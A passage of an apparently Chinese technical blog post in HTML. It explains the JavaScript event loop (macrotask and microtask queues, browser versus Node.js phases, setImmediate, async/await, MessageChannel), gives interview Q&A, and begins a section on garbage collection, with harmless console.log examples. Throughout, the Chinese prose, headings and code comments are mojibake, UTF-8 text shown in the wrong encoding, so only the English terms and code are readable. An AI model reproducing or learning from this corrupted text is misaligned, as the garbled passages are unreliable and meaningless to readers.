ˆä¸­çš„ä»»åŠ¡åï¼Œä¼šä»ä»»åŠ¡é˜Ÿåˆ—ä¸­å–å‡ºä¸‹ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œã€‚ä»»åŠ¡é˜Ÿåˆ—åˆ†ä¸ºä¸‰ç±»ï¼š</p><p>ï¼ˆ1ï¼‰å®ä»»åŠ¡é˜Ÿåˆ—ï¼ˆMacroTask Queueï¼‰</p><ul><li>scriptï¼ˆæ•´ä½“ä»£ç ï¼‰</li><li>setTimeout&#x2F;setInterval</li><li>I&#x2F;O æ“ä½œ</li><li>UI æ¸²æŸ“</li><li>MessageChannel</li><li>setImmediateï¼ˆNode.jsï¼‰</li></ul><p>æ¯æ¬¡äº‹ä»¶å¾ªç¯åªæ‰§è¡Œä¸€ä¸ªå®ä»»åŠ¡</p><p>ï¼ˆ2ï¼‰å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼ˆMicroTask Queueï¼‰</p><ul><li>Promise.then&#x2F;catch&#x2F;finally</li><li>MutationObeserver</li><li>queueMicrotask</li><li>process.nextTickï¼ˆNode.jsï¼Œä¼˜å…ˆçº§æœ€é«˜ï¼‰</li></ul><p>æ¯æ¬¡äº‹ä»¶å¾ªç¯ä¼šæ¸…ç©ºæ•´ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—</p><p>ï¼ˆ3ï¼‰å…¶ä»–ç‰¹æ®Šé˜Ÿåˆ—</p><ul><li>requestAnimationFrameï¼ˆæµè§ˆå™¨ï¼‰</li><li>requestIdleCallbackï¼ˆæµè§ˆå™¨ï¼‰</li><li>I&#x2F;O å›è°ƒé˜Ÿåˆ—ï¼šNode.js ç‰¹æœ‰çš„ I&#x2F;O ç›¸å…³å›è°ƒ</li></ul><p><strong>Web APIs</strong></p><p>æµè§ˆå™¨æä¾›çš„å¼‚æ­¥ APIï¼Œå¦‚ DOM ç‚¹å‡»äº‹ä»¶ã€Ajaxã€setTimeout ç­‰ï¼Œè¿™äº› API ç”±æµè§ˆå™¨çš„å…¶ä»–çº¿ç¨‹å¤„ç†ï¼Œå®Œæˆåå°†å›è°ƒæ”¾å…¥ä»»åŠ¡é˜Ÿåˆ—</p><h2 id="äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å·¥ä½œæµç¨‹"><a href="#äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å·¥ä½œæµç¨‹" class="headerlink" title="äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å·¥ä½œæµç¨‹"></a>äº‹ä»¶å¾ªç¯çš„è¯¦ç»†å·¥ä½œæµç¨‹</h2><p><strong>å®Œæ•´æ‰§è¡Œé¡ºåº</strong></p><ol><li>æ‰§è¡ŒåŒæ­¥ä»£ç ï¼šä» scriptï¼ˆæ•´ä½“ä»£ç ï¼‰å¼€å§‹ï¼Œä¾æ¬¡æ‰§è¡Œæ‰€æœ‰åŒæ­¥ä»»åŠ¡</li><li>æ£€æŸ¥å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼šæ‰§è¡Œæ ˆä¸ºç©ºåï¼Œä¾æ¬¡æ‰§è¡Œæ‰€æœ‰å¾®ä»»åŠ¡ï¼Œå¦‚æœå¾®ä»»åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­åˆäº§ç”Ÿäº†æ–°çš„å¾®ä»»åŠ¡ï¼Œä¼šç»§ç»­æ‰§è¡Œæ–°äº§ç”Ÿçš„å¾®ä»»åŠ¡ï¼Œç›´åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—æ¸…ç©º</li><li>UI æ¸²æŸ“ï¼ˆæµè§ˆå™¨ç¯å¢ƒï¼‰ï¼šæ›´æ–°ç•Œé¢</li><li>æ‰§è¡Œä¸€ä¸ªå®ä»»åŠ¡ï¼šä»å®ä»»åŠ¡é˜Ÿåˆ—ä¸­å–å‡ºæœ€æ—©çš„ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œ</li><li>é‡å¤æ­¥éª¤ 2ï½4ï¼Œå½¢æˆå¾ªç¯</li></ol><p><strong>å…³é”®ç‰¹æ€§</strong></p><ul><li>å¾®ä»»åŠ¡çš„ä¼˜å…ˆçº§é«˜äºå®ä»»åŠ¡ï¼šæ¯æ‰§è¡Œå®Œä¸€ä¸ªå®ä»»åŠ¡åï¼Œä¼šæ¸…ç©ºå¾®ä»»åŠ¡é˜Ÿåˆ—</li><li>å¾®ä»»åŠ¡æ’é˜Ÿæœºåˆ¶ï¼šå¾®ä»»åŠ¡å¯ä»¥æ’å…¥å½“å‰æ‰§è¡Œæ ˆæ ˆå°¾</li><li>ä»»åŠ¡åµŒå¥—çš„å¤„ç†ï¼šå¾®ä»»åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ–°çš„å¾®ä»»åŠ¡ä¼šåœ¨å½“å‰å‘¨æœŸå†…ç»§ç»­æ‰§è¡Œï¼Œå®ä»»åŠ¡ä¸­äº§ç”Ÿçš„ä»»åŠ¡ä¼šåœ¨è¿›å…¥é˜Ÿåˆ—ç­‰å¾…ä¸‹ä¸€è½®æ‰§è¡Œ</li><li>æ¸²æŸ“æ—¶æœºï¼šæµè§ˆå™¨é€šå¸¸ä¼šåœ¨å®ä»»åŠ¡ä¹‹é—´æ‰§è¡Œæ¸²æŸ“</li></ul><p><strong>ä»£ç ç¤ºä¾‹åˆ†æ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>);<br>  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise in setTimeout&#x27;</span>);<br>  &#125;);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise1&#x27;</span>);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;promise2&#x27;</span>);<br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;script end&#x27;</span>);<br><br><span class="hljs-comment">/* è¾“å‡ºé¡ºåºï¼š</span><br><span class="hljs-comment">script start</span><br><span class="hljs-comment">script end</span><br><span class="hljs-comment">promise1</span><br><span class="hljs-comment">promise2</span><br><span class="hljs-comment">setTimeout</span><br><span class="hljs-comment">promise in setTimeout</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œè¿‡ç¨‹åˆ†æï¼š</p><ol><li><p>åŒæ­¥ä»£ç æ‰§è¡Œï¼šæ‰“å° â€œscript startâ€œ å’Œ â€œscript endâ€œ</p></li><li><p>setTimeout å›è°ƒè¿›å…¥å®ä»»åŠ¡é˜Ÿåˆ—</p></li><li><p>Promise.then å›è°ƒè¿›å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—</p></li><li><p>åŒæ­¥ä»£ç æ‰§è¡Œå®Œæ¯•ï¼Œæ‰§è¡Œå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼š</p><ul><li>æ‰“å° â€œpromise1â€œï¼Œç¬¬äºŒä¸ª then è¿›å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—</li><li>æ‰“å° â€œpromise2â€œ</li></ul></li><li><p>æ‰§è¡Œå®ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ setTimeout å›è°ƒï¼š</p><ul><li>æ‰“å° â€œsetTimeoutâ€œ</li><li>Promise.then å›è°ƒè¿›å…¥å¾®ä»»åŠ¡é˜Ÿåˆ—</li></ul></li><li><p>å†æ¬¡æ£€æŸ¥å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œæ‰“å°â€œpromise in setTimeoutâ€</p></li></ol><h2 id="æµè§ˆå™¨ä¸Node-jsäº‹ä»¶å¾ªç¯å·®å¼‚"><a href="#æµè§ˆå™¨ä¸Node-jsäº‹ä»¶å¾ªç¯å·®å¼‚" class="headerlink" title="æµè§ˆå™¨ä¸Node.jsäº‹ä»¶å¾ªç¯å·®å¼‚"></a>æµè§ˆå™¨ä¸Node.jsäº‹ä»¶å¾ªç¯å·®å¼‚</h2><p><strong>æµè§ˆå™¨äº‹ä»¶å¾ªç¯ç‰¹ç‚¹</strong></p><ol><li>é˜¶æ®µç®€å•ï¼šä¸»è¦åˆ†ä¸ºå®ä»»åŠ¡æ‰§è¡Œã€å¾®ä»»åŠ¡æ‰§è¡Œã€UI æ¸²æŸ“ä¸‰ä¸ªé˜¶æ®µ</li><li>ä»»åŠ¡ç±»å‹ï¼šå®ä»»åŠ¡å’Œå¾®ä»»åŠ¡</li><li>æ¸²æŸ“æ—¶æœºï¼šåœ¨å®ä»»åŠ¡ä¹‹é—´å¯èƒ½è¿›è¡Œ UI æ¸²æŸ“</li></ol><p><strong>Node.js äº‹ä»¶å¾ªç¯ç‰¹ç‚¹</strong><br>Node.js ä½¿ç”¨ libuv åº“å®ç°äº‹ä»¶å¾ªç¯ï¼Œåˆ†ä¸ºå…­ä¸ªé˜¶æ®µï¼š</p><ol><li>timersï¼šæ‰§è¡Œ setTimeout å’Œ setInterval å›è°ƒ</li><li>pending callbacksï¼šæ‰§è¡Œç³»ç»Ÿæ“ä½œï¼ˆå¦‚ TCP é”™è¯¯ï¼‰çš„å›è°ƒ</li><li>idleï¼Œprepareï¼šä»… Node å†…éƒ¨ä½¿ç”¨</li><li>pollï¼šæ£€ç´¢æ–°çš„ I&#x2F;O äº‹ä»¶ï¼›æ‰§è¡Œä¸ I&#x2F;O ç›¸å…³çš„å›è°ƒï¼ˆé™¤äº† closeã€timers å’Œ setImmediateï¼‰ï¼›å¯èƒ½ä¼šé˜»å¡ç­‰å¾…æ–°äº‹ä»¶</li><li>checkï¼šæ‰§è¡Œ setImmediate å›è°ƒ</li><li>close callbackï¼šæ‰§è¡Œå…³é—­äº‹ä»¶çš„å›è°ƒï¼ˆå¦‚ socket.on(â€˜closeâ€™)ï¼‰</li></ol><p><strong>å…³é”®åŒºåˆ«å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">æµè§ˆå™¨</th><th align="left">Node.js</th></tr></thead><tbody><tr><td align="left">å®ç°åŸºç¡€</td><td align="left">æµè§ˆå™¨å¼•æ“</td><td align="left">libuv åº“</td></tr><tr><td align="left">é˜¶æ®µåˆ’åˆ†</td><td align="left">å®ä»»åŠ¡ã€å¾®ä»»åŠ¡ã€UI æ¸²æŸ“</td><td align="left">6 ä¸ªæ˜ç¡®é˜¶æ®µ</td></tr><tr><td align="left">setImmediate</td><td align="left">ä»… IE æ”¯æŒ</td><td align="left">æ ‡å‡† API</td></tr><tr><td align="left">process.nextTick</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æœ€é«˜ä¼˜å…ˆçº§å¾®ä»»åŠ¡</td></tr><tr><td align="left">I&#x2F;O å¤„ç†</td><td align="left">Web APIs</td><td align="left">libuv çº¿ç¨‹æ± </td></tr><tr><td align="left">ä»»åŠ¡ä¼˜å…ˆçº§</td><td align="left">å¾®ä»»åŠ¡ä¼˜å…ˆ</td><td align="left">nextTick &gt; å¾®ä»»åŠ¡</td></tr></tbody></table><p><strong>Node.js ç‰¹æ®Šè¡Œä¸º</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// timeout_vs_immediate.js</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;immediate&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>åœ¨ Node.js ä¸­ï¼Œä¸Šè¿°ä»£ç çš„è¾“å‡ºé¡ºåºæ˜¯ä¸ç¡®å®šçš„ï¼Œå› ä¸ºå—è¿›ç¨‹æ€§èƒ½å½±å“ã€‚ä½†åœ¨ I&#x2F;O å‘¨æœŸå†…è°ƒç”¨æ—¶ï¼ŒsetImmediate æ€»æ˜¯ä¼˜å…ˆäº setTimeout</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(__filename, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;timeout&#x27;</span>);<br>  &#125;, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;immediate&#x27;</span>);<br>  &#125;);<br>&#125;);<br><span class="hljs-comment">// æ€»æ˜¯è¾“å‡º: immediate -&gt; timeout</span><br></code></pre></td></tr></table></figure><h2 id="é«˜çº§åº”ç”¨åœºæ™¯"><a href="#é«˜çº§åº”ç”¨åœºæ™¯" class="headerlink" title="é«˜çº§åº”ç”¨åœºæ™¯"></a>é«˜çº§åº”ç”¨åœºæ™¯</h2><p><strong>Vue.nextTick å®ç°åŸç†</strong></p><p>Vue é€šè¿‡å¾®ä»»åŠ¡é˜Ÿåˆ—å®ç°å¼‚æ­¥ DOM æ›´æ–°ã€‚åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­ï¼ŒVue ä¼šä¼˜å…ˆä½¿ç”¨Promise.thenï¼Œé™çº§æ–¹æ¡ˆåŒ…æ‹¬ mutationObeserver å’Œ setTimeout</p><p><strong>async&#x2F;await çš„æ‰§è¡Œæ—¶æœº</strong></p><p>async å‡½æ•°è¿”å› promiseï¼Œawait å®é™…ä¸Šä¼šæš‚åœå‡½æ•°æ‰§è¡Œï¼Œå°†åç»­ä»£ç ä½œä¸ºå¾®ä»»åŠ¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">bar</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// ç›¸å½“äºPromise.then</span><br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-title function_">foo</span>();<br><span class="hljs-comment">// è¾“å‡º: 1, 2, 3</span><br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨ MessageChannel å®ç°é«˜ä¼˜å…ˆçº§å¼‚æ­¥</strong></p><p>MessageChannel çš„å›è°ƒä½œä¸ºå®ä»»åŠ¡ï¼Œä½†ä¼˜å…ˆçº§é«˜äº setTimeout</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();<br>channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;MessageChannel callback&#x27;</span>);<br>&#125;;<br>channel.<span class="hljs-property">port2</span>.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;setTimeout&#x27;</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// è¾“å‡ºé¡ºåº: MessageChannel callback -&gt; setTimeout</span><br></code></pre></td></tr></table></figure><h2 id="é¢è¯•å¸¸è§é—®é¢˜-4"><a href="#é¢è¯•å¸¸è§é—®é¢˜-4" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šsetTimeout(fn, 0)æ˜¯ç«‹å³æ‰§è¡Œå—ï¼Ÿ</strong></p><p>ä¸æ˜¯ï¼Œå®ƒè¡¨ç¤ºâ€å°½å¿«æ‰§è¡Œâ€œï¼Œä½†è¦ç­‰åˆ°ï¼š</p><ol><li>å½“å‰åŒæ­¥ä»£ç æ‰§è¡Œå®Œ</li><li>æ‰€æœ‰å¾®ä»»åŠ¡æ‰§è¡Œå®Œ</li><li>å¯èƒ½è¿˜è¦ç­‰å¾… UI æ¸²æŸ“</li></ol><p><strong>Qï¼šä¸ºä»€ä¹ˆ promise æ˜¯å¾®ä»»åŠ¡ï¼Ÿ</strong></p><p>ä¸ºäº†ç¡®ä¿å¼‚æ­¥å›è°ƒçš„é«˜ä¼˜å…ˆçº§æ‰§è¡Œï¼Œé¿å…è¢«å…¶ä»–å®ä»»åŠ¡å»¶è¿Ÿ</p><p><strong>Qï¼šå¦‚ä½•ç†è§£ â€œJavaScript æ˜¯å•çº¿ç¨‹â€œï¼Ÿ</strong></p><p>JavaScript åªæœ‰ä¸€ä¸ªä¸»çº¿ç¨‹æ‰§è¡Œè°ƒç”¨æ ˆä¸­çš„ä»£ç ï¼Œä½†æµè§ˆå™¨æ˜¯å¤šçº¿ç¨‹çš„ï¼ˆå¦‚ç½‘ç»œè¯·æ±‚ã€å®šæ—¶å™¨ç­‰ç”±å…¶ä»–çº¿ç¨‹å¤„ç†ï¼‰</p><h1 id="JavaScript-åƒåœ¾å›æ”¶æœºåˆ¶"><a href="#JavaScript-åƒåœ¾å›æ”¶æœºåˆ¶" class="headerlink" title="JavaScript åƒåœ¾å›æ”¶æœºåˆ¶"></a>JavaScript åƒåœ¾å›æ”¶æœºåˆ¶</h1><h2 id="å†…å­˜ç®¡ç†åŸºç¡€"><a href="#å†…å­˜ç®¡ç†åŸºç¡€" class="headerlink" title="å†…å­˜ç®¡ç†åŸºç¡€"></a>å†…å­˜ç®¡ç†åŸºç¡€</h2><h3 id="å†…å­˜ç”Ÿå‘½å‘¨æœŸ"><a href="#å†…å­˜ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="å†…å­˜ç”Ÿå‘½å‘¨æœŸ"></a>å†…å­˜ç”Ÿå‘½å‘¨æœŸ</h3><p>JavaScript å†…å­˜ç®¡ç†éµå¾ªä»¥ä¸‹ç”Ÿå‘½å‘¨æœŸï¼š</p><ul><li>åˆ†é…åˆ†é…ï¼šå½“åˆ›å»ºå˜é‡ã€å‡½æ•°æˆ–å¯¹è±¡æ—¶è‡ªåŠ¨åˆ†é…</li><li>ä½¿ç”¨å†…å­˜ï¼šå¯¹å†…å­˜è¿›è¡Œè¯»å†™æ“ä½œ</li><li>é‡Šæ”¾å†…å­˜ï¼šå½“å†…å­˜ä¸å†è¢«éœ€è¦æ—¶ï¼Œé€šè¿‡åƒåœ¾å›æ”¶æœºåˆ¶è‡ªåŠ¨é‡Šæ”¾</li></ul><h3 id="å†…å­˜åˆ†é…æœºåˆ¶"><a href="#å†…å­˜åˆ†é…æœºåˆ¶" class="headerlink" title="å†…å­˜åˆ†é…æœºåˆ¶"></a>å†…å­˜åˆ†é…æœºåˆ¶</h3><p>JavaScript å¼•æ“ï¼ˆV8ï¼‰åœ¨å˜é‡å£°æ˜æ—¶è‡ªåŠ¨åˆ†é…å†…å­˜ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç±»å­˜å‚¨åŒºåŸŸï¼š</p><p><strong>æ ˆå†…å­˜ï¼ˆStackï¼‰</strong></p><p>æ ˆå†…å­˜è´Ÿè´£å­˜å‚¨åŸºæœ¬ç±»å‹ï¼ˆ<code>null</code>ã€<code>undefined</code>ã€<code>Symbol</code>ã€<code>Number</code>ã€<code>String</code>ã€<code>Boolean</code>ã€<code>BigInt</code>ï¼‰å’Œå¯¹è±¡çš„å¼•ç”¨åœ°å€ï¼Œå…¶ç‰¹ç‚¹æ˜¯ï¼š</p><ul><li>ç©ºé—´å›ºå®šï¼ˆé€šå¸¸ 1ï½10MBï¼‰ï¼Œç”±æ“ä½œç³»ç»Ÿç›´æ¥ç®¡ç†</li><li>åˆ†é…å’Œå›æ”¶é€Ÿåº¦å¿«ï¼ˆé€šè¿‡ç§»åŠ¨æ ˆæŒ‡é’ˆå®ç°ï¼‰</li><li>å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå±€éƒ¨å˜é‡è‡ªåŠ¨é‡Šæ”¾</li></ul><p><strong>å †å†…å­˜ï¼ˆHeapï¼‰</strong></p><p>å †å†…å­˜è´Ÿè´£å­˜å‚¨å¼•ç”¨ç±»å‹ï¼ˆå¯¹è±¡ã€æ•°ç»„ã€å‡½æ•°ç­‰ï¼‰çš„å®é™…æ•°æ®ï¼Œå…¶ç‰¹ç‚¹æ˜¯ï¼š</p><ul><li>ç©ºé—´åŠ¨æ€ï¼ˆ64ä½ç³»ç»Ÿä¸Šé™çº¦ä¸º 1.4GBï¼‰ï¼Œç”±åƒåœ¾å›æ”¶å™¨ï¼ˆGCï¼‰ç®¡ç†</li><li>åˆ†é…ä¸å›æ”¶æˆæœ¬é«˜ï¼Œéœ€è¦é¿å…å†…å­˜ç¢ç‰‡</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç¤ºä¾‹ï¼šå†…å­˜åˆ†é…</span><br><span class="hljs-keyword">let</span> num = <span class="hljs-number">10</span>;          <span class="hljs-comment">// æ ˆï¼šåŸºæœ¬ç±»å‹</span><br><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> &#125;;   <span class="hljs-comment">// å †ï¼šå¯¹è±¡æ•°æ®ï¼Œæ ˆä¸­å­˜å‚¨å…¶å¼•ç”¨åœ°å€</span><br></code></pre></td></tr></table></figure><h2 id="å†…å­˜ä½¿ç”¨è§„åˆ™"><a href="#å†…å­˜ä½¿ç”¨è§„åˆ™" class="headerlink" title="å†…å­˜ä½¿ç”¨è§„åˆ™"></a>å†…å­˜ä½¿ç”¨è§„åˆ™</h2><ul><li>åŸºæœ¬ç±»å‹ï¼šç›´æ¥æ“ä½œæ ˆå†…å­˜ä¸­çš„å€¼ï¼ˆæŒ‰å€¼è®¿é—®ï¼‰</li><li>å¼•ç”¨ç±»å‹ï¼šé€šè¿‡æ ˆå†…å­˜ä¸­çš„å¼•ç”¨åœ°å€æ“ä½œå †å†…å­˜ä¸­çš„æ•°æ®ï¼ˆæŒ‰å¼•ç”¨è®¿é—®ï¼‰</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> a = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> b = a;  <span class="hljs-comment">// b å¤åˆ¶ a çš„å¼•ç”¨åœ°å€ï¼ŒæŒ‡å‘åŒä¸€å †å¯¹è±¡</span><br>b.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">name</span>); <span class="hljs-comment">// &quot;Bob&quot;ï¼ˆå †å†…æ•°æ®è¢«ä¿®æ”¹ï¼‰</span><br></code></pre></td></tr></table></figure><h2 id="åƒåœ¾å›æ”¶ç®—æ³•"><a href="#åƒåœ¾å›æ”¶ç®—æ³•" class="headerlink" title="åƒåœ¾å›æ”¶ç®—æ³•"></a>åƒåœ¾å›æ”¶ç®—æ³•</h2><p>JavaScript ä¸»è¦ä½¿ç”¨ä¸¤ç§åƒåœ¾å›æ”¶ç®—æ³•ï¼š</p><p><strong>æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark-and-Sweepï¼‰ï¼ˆä¸»æµç®—æ³•ï¼‰</strong></p><p>å·¥ä½œåŸç†ï¼š</p><ul><li>æ ‡è®°é˜¶æ®µï¼šä»æ ¹å¯¹è±¡ï¼ˆå…¨å±€å¯¹è±¡ã€å½“å‰æ‰§è¡Œæ ˆç­‰ï¼‰è§¦å‘ï¼Œé€’å½’æ ‡è®°æ‰€æœ‰å¯è¾¾å¯¹è±¡</li><li>æ¸…é™¤é˜¶æ®µï¼šå›æ”¶æ‰€æœ‰æœªè¢«æ ‡è®°çš„å¯¹è±¡</li></ul><p>ä¼˜ç‚¹ï¼š</p><ul><li>è§£å†³äº†å¾ªç¯å¼•ç”¨çš„é—®é¢˜</li><li>å®ç°ç›¸å¯¹ç®€å•</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>å¯èƒ½é€ æˆå†…å­˜ç¢ç‰‡</li><li>å…¨å †æ‰«æå¯èƒ½å½±å“æ€§èƒ½</li></ul><p>å†…å­˜ç¢ç‰‡çš„é—®é¢˜å¯ä»¥é€šè¿‡ï¼šæ ‡è®°-æ•´ç†ï¼ˆMark-Compactï¼‰å°†å­˜æ´»å¯¹è±¡ç§»è‡³å†…å­˜ä¸€ç«¯</p><p><strong>å¼•ç”¨è®¡æ•°ç®—æ³•ï¼ˆReference Countingï¼‰ï¼ˆå·²æ·˜æ±°ï¼‰</strong></p><p>å·¥ä½œåŸç†ï¼š</p><ul><li>ç»Ÿè®¡å¯¹è±¡è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼Œå½’é›¶æ—¶é‡Šæ”¾</li></ul><p>ä¼˜ç‚¹ï¼š</p><ul><li>ç«‹å³å›æ”¶ã€å†…å­˜é‡Šæ”¾åŠæ—¶</li><li>æ‰§è¡Œè¿‡ç¨‹åˆ†æ•£ï¼Œæ²¡æœ‰æ˜æ˜¾åœé¡¿</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</li><li>è®¡æ•°å™¨ç»´æŠ¤å¼€é”€å¤§</li></ul><p>ç°ä»£æµè§ˆå™¨å·²ä¸å†å•ç‹¬ä½¿ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•</p><h2 id="V8-å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶"><a href="#V8-å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶" class="headerlink" title="V8 å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶"></a>V8 